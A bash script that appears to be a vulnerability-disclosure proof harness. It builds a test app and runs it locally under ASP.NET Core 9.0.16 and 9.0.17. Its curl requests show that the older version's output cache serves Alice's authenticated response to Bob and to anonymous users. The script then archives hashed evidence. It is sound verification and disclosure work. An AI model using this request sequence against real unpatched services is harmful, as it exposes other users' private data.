#!/usr/bin/env bash
set -euo pipefail

PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORK_DIR="${PROJECT_DIR}/evidence-$(date -u +%Y%m%dT%H%M%SZ)"
PUBLISH_DIR="${WORK_DIR}/publish"
SUMMARY_FILE="${WORK_DIR}/SUMMARY.txt"

mkdir -p "$PUBLISH_DIR"

for command in docker curl grep awk sha256sum; do
  command -v "$command" >/dev/null || {
    echo "Missing required command: $command" >&2
    exit 2
  }
done

cleanup() {
  docker rm -f outputcache-proof-9016 outputcache-proof-9017 >/dev/null 2>&1 || true
}
trap cleanup EXIT
cleanup

printf 'Publishing controlled proof application...\n'
docker run --rm \
  -v "$PROJECT_DIR:/src:ro" \
  -v "$PUBLISH_DIR:/out" \
  -w /src \
  mcr.microsoft.com/dotnet/sdk:9.0 \
  dotnet publish OutputCacheVersionProof.csproj \
    --configuration Release \
    --output /out \
    --nologo

run_case() {
  local version="$1"
  local port="$2"
  local container_name="$3"
  local expectation="$4"
  local case_dir="$WORK_DIR/$version"

  mkdir -p "$case_dir"

  docker run -d --rm \
    --name "$container_name" \
    -p "127.0.0.1:${port}:8080" \
    -e ASPNETCORE_URLS=http://+:8080 \
    -e DOTNET_ROLL_FORWARD=Disable \
    -v "$PUBLISH_DIR:/app:ro" \
    -w /app \
    "mcr.microsoft.com/dotnet/aspnet:${version}" \
    dotnet OutputCacheVersionProof.dll \
    > "$case_dir/container-id.txt"

  for _ in $(seq 1 60); do
    if curl -fsS "http://127.0.0.1:${port}/health" >/dev/null; then
      break
    fi
    sleep 1
  done
  curl -fsS "http://127.0.0.1:${port}/health" > "$case_dir/health.txt"

  curl -sS -D "$case_dir/01-login-alice.headers" \
    -o "$case_dir/01-login-alice.body" \
    -c "$case_dir/alice.cookies" \
    "http://127.0.0.1:${port}/login/alice"

  curl -sS -D "$case_dir/02-alice-private.headers" \
    -o "$case_dir/02-alice-private.body" \
    -b "$case_dir/alice.cookies" \
    "http://127.0.0.1:${port}/private"

  curl -sS -D "$case_dir/03-login-bob.headers" \
    -o "$case_dir/03-login-bob.body" \
    -c "$case_dir/bob.cookies" \
    "http://127.0.0.1:${port}/login/bob"

  curl -sS -D "$case_dir/04-bob-private.headers" \
    -o "$case_dir/04-bob-private.body" \
    -b "$case_dir/bob.cookies" \
    "http://127.0.0.1:${port}/private"

  curl -sS -D "$case_dir/05-anonymous-private.headers" \
    -o "$case_dir/05-anonymous-private.body" \
    -w '%{http_code}\n' \
    "http://127.0.0.1:${port}/private" \
    > "$case_dir/05-anonymous-private.status"

  curl -sS -D "$case_dir/06-bob-nocache.headers" \
    -o "$case_dir/06-bob-nocache.body" \
    -b "$case_dir/bob.cookies" \
    "http://127.0.0.1:${port}/private-nocache"

  docker logs "$container_name" > "$case_dir/container.log" 2>&1 || true
  docker rm -f "$container_name" >/dev/null

  grep -F 'PRIVATE_USER=alice;ACCOUNT=account-alice;EXEC_COUNT=1;AUTH_METADATA=True;ALLOW_ANON=False' \
    "$case_dir/02-alice-private.body" >/dev/null
  grep -F 'NO_CACHE_USER=bob;ACCOUNT=account-bob' \
    "$case_dir/06-bob-nocache.body" >/dev/null

  if [[ "$expectation" == vulnerable ]]; then
    grep -F 'PRIVATE_USER=alice;ACCOUNT=account-alice;EXEC_COUNT=1;AUTH_METADATA=True;ALLOW_ANON=False' \
      "$case_dir/04-bob-private.body" >/dev/null
    grep -i '^age:' "$case_dir/04-bob-private.headers" >/dev/null
    grep -Fx '200' "$case_dir/05-anonymous-private.status" >/dev/null
    grep -F 'PRIVATE_USER=alice;ACCOUNT=account-alice;EXEC_COUNT=1;AUTH_METADATA=True;ALLOW_ANON=False' \
      "$case_dir/05-anonymous-private.body" >/dev/null
  else
    grep -F 'PRIVATE_USER=bob;ACCOUNT=account-bob;EXEC_COUNT=2;AUTH_METADATA=True;ALLOW_ANON=False' \
      "$case_dir/04-bob-private.body" >/dev/null
    if grep -i '^age:' "$case_dir/04-bob-private.headers" >/dev/null; then
      echo "Unexpected cached response under fixed version ${version}." >&2
      exit 1
    fi
    grep -Fx '401' "$case_dir/05-anonymous-private.status" >/dev/null
  fi

  {
    echo "VERSION=$version"
    echo "EXPECTATION=$expectation"
    echo "ALICE_RESPONSE=$(cat "$case_dir/02-alice-private.body")"
    echo "BOB_RESPONSE=$(cat "$case_dir/04-bob-private.body")"
    echo "BOB_AGE_HEADER=$(grep -i '^age:' "$case_dir/04-bob-private.headers" | tr -d '\r' || true)"
    echo "ANONYMOUS_STATUS=$(cat "$case_dir/05-anonymous-private.status")"
    echo "ANONYMOUS_RESPONSE=$(cat "$case_dir/05-anonymous-private.body")"
    echo "NO_CACHE_BOB_RESPONSE=$(cat "$case_dir/06-bob-nocache.body")"
  } > "$case_dir/RESULT.txt"
}

run_case '9.0.16' '50916' 'outputcache-proof-9016' vulnerable
run_case '9.0.17' '50917' 'outputcache-proof-9017' fixed

{
  echo 'VULN-187171 LOCAL VERSION-DIFFERENTIAL RESULT'
  echo "UTC=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  echo
  echo '=== ASP.NET Core 9.0.16 ==='
  cat "$WORK_DIR/9.0.16/RESULT.txt"
  echo
  echo '=== ASP.NET Core 9.0.17 ==='
  cat "$WORK_DIR/9.0.17/RESULT.txt"
  echo
  echo 'VERDICT=9.0.16 replays Alice protected output to Bob and anonymous; 9.0.17 prevents storage of the authenticated response.'
} | tee "$SUMMARY_FILE"

find "$WORK_DIR" -type f ! -name SHA256SUMS.txt -print0 \
  | sort -z \
  | xargs -0 sha256sum \
  > "$WORK_DIR/SHA256SUMS.txt"

tar -C "$(dirname "$WORK_DIR")" -czf "${WORK_DIR}.tar.gz" "$(basename "$WORK_DIR")"
sha256sum "${WORK_DIR}.tar.gz" > "${WORK_DIR}.tar.gz.sha256"

printf '\nEvidence directory: %s\n' "$WORK_DIR"
printf 'Evidence archive: %s\n' "${WORK_DIR}.tar.gz"
printf 'Archive checksum: %s\n' "${WORK_DIR}.tar.gz.sha256"
